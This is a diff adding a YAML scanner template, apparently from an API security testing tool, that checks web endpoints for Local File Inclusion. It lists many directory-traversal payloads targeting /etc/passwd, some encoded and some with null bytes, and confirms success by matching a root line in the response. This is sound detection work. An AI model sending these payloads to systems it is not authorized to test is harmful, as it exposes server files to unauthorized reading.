@@ -1,0 +1,75 @@
+id: LFI_IN_PATH
+info:
+  name: "LFI in path"
+  description: "This test appends vulnerable payloads to the end of the URL, checking for Local File Inclusion vulnerabilities by manipulating file path references." 
+  details: >
+            "Assesses the vulnerability of a web application to Local File Inclusion vulnerabilities by appending vulnerable payloads at the end of the URL."
+            "By manipulating file path references, this test helps identify potential security weaknesses that could lead to unauthorized access, information disclosure, and server compromise"
+  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: LFI_IN_PATH
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+api_selection_filters:
+  url:
+    extract: urlVar
+  response_payload:
+    contains_either:
+      - <!doctype html>
+
+wordLists:
+  filePaths: 
+    - etc/passwd
+    - /etc/passwd
+    - /etc/npasswd
+    - ..//etc/passwd
+    - ../..//etc/passwd
+    - ../../..//etc/passwd
+    - ../../../..//etc/passwd
+    - ../../../../..//etc/passwd
+    - ../../../../../..//etc/passwd
+    - ..%2f/etc/passwd
+    - ..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..\/etc/passwd
+    - ..\..\/etc/passwd
+    - ..\..\..\/etc/passwd
+    - ..\..\..\..\/etc/passwd
+    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
+    - 0x2e0x2e//etc/passwd
+    - 0x2e0x2e/0x2e0x2e//etc/passwd
+    - ..0x2f/etc/passwd
+    - ..0x2f..0x2f/etc/passwd
+    - ..0x2f..0x2f..0x2f/etc/passwd
+    - ..///etc/passwd
+    - ..//..///etc/passwd
+    - ..//..//..///etc/passwd
+    - .\\..\\/etc/passwd
+    - .\\..\\.\\..\\/etc/passwd
+    - ../../../../../../../../../../../../etc/passwd%00
+
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url:
+          regex_replace:
+            regex: \/$
+            replace_with: ''
+      - modify_url: ${urlVar}/etc/passwd
+
+validate:
+  response_payload:
+    regex: "root:.*:0:0:"
